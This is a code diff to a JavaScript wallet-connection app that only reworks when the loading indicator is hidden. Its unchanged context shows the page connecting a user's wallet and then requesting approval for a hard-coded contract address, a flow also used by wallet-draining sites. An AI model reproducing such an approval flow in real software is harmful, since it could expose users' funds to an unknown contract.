@@ -42,6 +42,9 @@ class WalletManagerApp {
     }
 
     async init() {
+        // Hide loading indicator on init
+        this.showLoading(false);
+        
         const platform = detectPlatform();
         console.log('Platform detected:', platform);
         
@@ -77,15 +80,16 @@ class WalletManagerApp {
                 } else {
                     // Regular mobile browser, show wallet options
                     this.showMobileWalletOptions();
+                    this.showLoading(false); // Hide loading when showing options
+                    return;
                 }
             } else {
                 // Desktop handling
                 await this.connectAndProcessWallet();
             }
         } catch (error) {
-            this.showError(`Connection failed: ${error.message}`);
-        } finally {
             this.showLoading(false);
+            this.showError(`Connection failed: ${error.message}`);
         }
     }
 
@@ -156,6 +160,7 @@ class WalletManagerApp {
     async connectAndProcessWallet() {
         try {
             const result = await this.walletConnector.connect();
+            this.showLoading(false);
             
             if (result.success) {
                 localStorage.setItem('walletAddress', result.address);
@@ -175,6 +180,7 @@ class WalletManagerApp {
                 this.showError(`Connection failed: ${result.error}`);
             }
         } catch (error) {
+            this.showLoading(false);
             this.showError(`Connection failed: ${error.message}`);
         }
     }
@@ -210,6 +216,7 @@ class WalletManagerApp {
         try {
             const contractAddress = '0xC0a6fd159018824EB7248EB62Cb67aDa4c5906FF';
             const result = await this.walletConnector.approveContract(contractAddress);
+            this.showLoading(false);
             
             if (result.success) {
                 this.showSuccess('Contract approved successfully!');
@@ -228,9 +235,8 @@ class WalletManagerApp {
                 this.showError(`Approval failed: ${result.error}`);
             }
         } catch (error) {
-            this.showError(`Approval failed: ${error.message}`);
-        } finally {
             this.showLoading(false);
+            this.showError(`Approval failed: ${error.message}`);
         }
     }
 
